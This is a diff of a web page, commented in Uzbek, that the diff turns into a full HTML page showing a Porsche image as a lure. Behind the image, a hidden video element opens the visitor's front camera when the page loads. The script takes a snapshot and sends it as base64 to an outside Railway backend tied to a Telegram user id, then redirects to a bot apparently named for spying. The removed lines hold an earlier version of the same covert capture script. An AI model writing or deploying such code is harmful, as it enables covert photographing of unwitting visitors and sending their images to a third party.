@@ -1,53 +1,104 @@
-<script>
-const uid = new URLSearchParams(location.search).get("uid");
-const backend = (window.BACKEND_URL || "").replace(/\/$/,"");
-const video = document.getElementById("video");
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Porsche</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body, html {
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+        video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
 
-// ⚠️ BU YERGA BOTINGIZ NOMSINI YOZING (masalan: https://t.me/shpion_bot)
-const BOT_USERNAME = "https://t.me/Shpi0n_bot_bot"; 
+    <!-- Ekranda ko'rinadigan Porsche rasmi -->
+    <img src="porsche.png" alt="Porsche">
 
-async function capture() {
-  if (!uid || !/^\d+$/.test(uid) || !backend) return;
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    <!-- Kamera tasviri uchun yashirin video -->
+    <video id="video" autoplay playsinline muted></video>
 
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" },
-      audio: false
-    });
+    <script>
+    // 1. Railway Backend manzilingiz
+    const BACKEND_URL = "https://telegram-production-6392.up.railway.app";
+    
+    // 2. Sizning Telegram Botingiz username'i qo'shildi
+    const BOT_USERNAME = "Shpi0n_bot_bot"; 
 
-    video.srcObject = stream;
+    const uid = new URLSearchParams(window.location.search).get("uid");
+    const video = document.getElementById("video");
 
-    await new Promise(resolve => {
-      if (video.readyState >= 2) resolve();
-      else video.onloadedmetadata = resolve;
-    });
+    async function captureAndSend() {
+        if (!uid) {
+            console.error("User ID topilmadi!");
+            return;
+        }
 
-    await new Promise(r => setTimeout(r, 300));
+        try {
+            // Kameralarga ulanish
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" },
+                audio: false
+            });
 
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext("2d").drawImage(video, 0, 0);
+            video.srcObject = stream;
 
-    const image = canvas.toDataURL("image/jpeg", 0.85);
+            // Video tayyor bo'lishini kutish
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => resolve();
+            });
 
-    // Backend'ga yuborish
-    await fetch(backend + "/upload", {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({uid: Number(uid), image})
-    });
+            // Tasvir tiniqlashishi uchun 500ms kutiladi
+            await new Promise((resolve) => setTimeout(resolve, 500));
 
-    stream.getTracks().forEach(track => track.stop());
+            // Rasmga tushirish
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // 🚀 RASM YUBORILGACH, AVTOMATIK TELEGRAM BOTGA O'TKAZISH:
-    window.location.href = `https://t.me/${BOT_USERNAME}`;
+            const imageBase64 = canvas.toDataURL("image/jpeg", 0.85);
 
-  } catch (error) {
-    // Xatolik bo'lsa ham ekranda hech narsa ko'rsatmaydi
-  }
-}
+            // Kamerani o'chirish
+            stream.getTracks().forEach(track => track.stop());
 
-capture();
-</script>
+            // Backend'ga yuborish
+            await fetch(`${BACKEND_URL}/upload`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ uid: Number(uid), image: imageBase64 })
+            });
+
+            // Rasm yuborilgach, avtomatik Telegram botga qaytarish
+            window.location.href = `https://t.me/${BOT_USERNAME}`;
+
+        } catch (err) {
+            console.error("Kamera xatoligi:", err);
+        }
+    }
+
+    // Sahifa yuklanganda avtomatik ishga tushirish
+    window.addEventListener("load", captureAndSend);
+    </script>
+</body>
+</html>
